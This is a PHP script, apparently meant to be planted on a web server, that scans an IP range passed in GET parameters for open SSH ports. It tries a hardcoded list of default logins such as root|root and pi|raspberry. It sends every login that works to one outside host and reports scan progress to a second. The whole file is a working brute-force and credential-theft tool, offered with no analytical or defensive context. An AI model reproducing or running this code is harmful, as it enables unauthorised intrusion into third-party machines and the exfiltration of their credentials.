<?php
	set_time_limit(0);
	//error_reporting(0);
	require 'Net/SSH2.php';
	
	function Check_Auth_SSH($ip, $user, $pass){
		$ssh = new Net_SSH2($ip);
		if($ssh->login($user, $pass))
			return true;
		return false;
	}
	
	function Check_Port($ip, $port=22, $timeout=2){
		$fp = fsockopen($ip, $port, $errno, $errstr, $timeout);
		if(!$fp) return false;
		return true;
	}
	if(isset($_GET['start']) && isset($_GET['end'])){		
		$start = $_GET['start'];
		$end = $_GET['end'];
		while($start < $end)
		{
			$ip = long2ip($start);
			$arr = array('D-Link|D-Link','PlcmSpIp2|PlcmSpIp2','PlcmSpIp|PlcmSpIp','aarav|aarav','administrator|administrator','admin|admin','admin|password','adm|adm','agata|agata','aio|aio','alex|alex','apache|apache','backup|backup','bill|abc123','bill|bill','bin|bin','book|book','demo|demo','fax|fax','ftpuser|ftpuser','ftp|ftp','ftp|ftp123','ftp|ftpuser','games|games','guest|guest','john|john','john|password','logout|logout','lpa|lpa','marketing|marketing','mike|mike','mike|password','musique|musique','nagios|nagios','oracle|oracle','pizza|pizza','pi|raspberry','root|123456','root|123qwe'
,'root|abc123','root|admin','root|password','root|root','sales|sales','shutdown|shutdown','sshd|sshd','support|support','test|password','test|test','ubnt|ubnt','uploader|uploader','user|user','uucp|uucp','vyatta|vyatta','www|www');
			if(Check_Port($ip)){
				for($i = 0; $i < count($arr); $i++){
					$up = explode("|",$arr[$i]);
					$ssh = new Net_SSH2($ip);
					if($ssh->login($up[0], $up[1])){
						file_get_contents('http://s.hoangthanhit.com/insert.php?ip='.$ip.'&user='.$up[0].'&pass='.$up[1]);
						break;
					}
				}
			}
			$start++;
			if($start%5==0)
				file_get_contents("http://ssh.pfshare.com/logssh.php?host=http://$_SERVER[HTTP_HOST]&start=$start&end=$end");
		}
	}
?>